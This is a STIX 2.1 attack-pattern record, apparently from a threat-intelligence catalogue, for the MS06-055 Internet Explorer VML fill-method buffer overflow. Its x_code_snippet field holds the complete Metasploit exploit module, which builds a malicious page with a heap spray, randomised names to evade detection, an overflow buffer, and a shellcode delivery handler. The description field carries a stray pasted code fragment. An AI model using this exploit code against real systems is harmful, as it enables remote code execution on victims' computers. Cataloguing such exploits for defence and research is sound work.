{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03c2f2f8-76fa-42be-8110-dfca7ee11865",
    "created": "2024-08-14T16:44:12.34559Z",
    "modified": "2024-08-14T16:44:12.345594Z",
    "name": "MS06-055 Microsoft Internet Explorer VML Fill Method Code Execution",
    "description": " This module exploits a code execution vulnerability in Microsoft Internet Explorer using a buffer overflow in the VML processing code (VGX.dll). This module has been tested on Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_055_vml_method.rb",
            "external_id": "ms06_055_vml_method.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4868"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-055 Microsoft Internet Explorer VML Fill Method Code Execution',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in Microsoft Internet Explorer using\n        a buffer overflow in the VML processing code (VGX.dll). This module has been tested on\n        Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm',\n          'Aviv Raff <avivra[at]gmail.com>',\n          'Trirat Puttaraksa (Kira) <trir00t[at]gmail.com>',\n          'Mr.Niega <Mr.Niega[at]gmail.com>',\n          'M. Shirk <shirkdog_list[at]hotmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE',   '2006-4868'],\n          ['OSVDB', '28946'],\n          ['MSB',   'MS06-055'],\n          ['BID',   '20096'],\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'BadChars'       => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows NT 4.0 -> Windows 2003 SP1', {'Ret' => 0x0c0c0c0c} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-09-19'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Determine the buffer length to use\n    buflen = 1024\n    if (request.headers['User-Agent'] =~ /Windows 5\\.[123]/)\n      buflen = 65535\n    end\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Get a unicode friendly version of the return address\n    addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]\n\n    # Select a random VML element to use\n    vmls = %w{ rect roundrect line polyline oval image arc curve }\n    vmlelem = vmls[ rand(vmls.length) ]\n\n    # The overflow buffer for the method attribute\n    buffer = (\"&#x\" + addr_word + \";\") * buflen\n\n    # Generate a random XML namespace for VML\n    xmlns = rand_text_alpha(rand(30)+2)\n\n    # Randomize the javascript variable names\n    var_buffer    = rand_text_alpha(rand(30)+2)\n    var_shellcode = rand_text_alpha(rand(30)+2)\n    var_unescape  = rand_text_alpha(rand(30)+2)\n    var_x         = rand_text_alpha(rand(30)+2)\n    var_i         = rand_text_alpha(rand(30)+2)\n\n    # Build out the message\n    content = %Q|\n<html xmlns:#{xmlns} = \" urn:schemas-microsoft-com:vml \" >\n<head>\n<style> #{xmlns}\\\\:* { behavior: url(#default#VML) ; } </style>\n<body>\n<script>\n\n  var #{var_unescape}  = unescape ;\n  var #{var_shellcode} = #{var_unescape}( \"#{shellcode}\" ) ;\n\n  var #{var_buffer} = #{var_unescape}( \"%u#{addr_word}\" ) ;\n  while (#{var_buffer}.length <= 0x400000) #{var_buffer}+=#{var_buffer} ;\n\n  var #{var_x} = new Array() ;\n  for ( var #{var_i} =0 ; #{var_i} < 30 ; #{var_i}++ ) {\n    #{var_x}[ #{var_i} ] =\n      #{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +\n      #{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +\n      #{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +\n      #{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;\n  }\n\n</script>\n<#{xmlns}:#{vmlelem}>\n  <#{xmlns}:fill method = \"#{buffer}\" />\n</#{xmlns}:#{vmlelem}>\n\n</body>\n</html>\n    |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-09-19",
    "x_mitre_platforms": [
        "win'"
    ]
}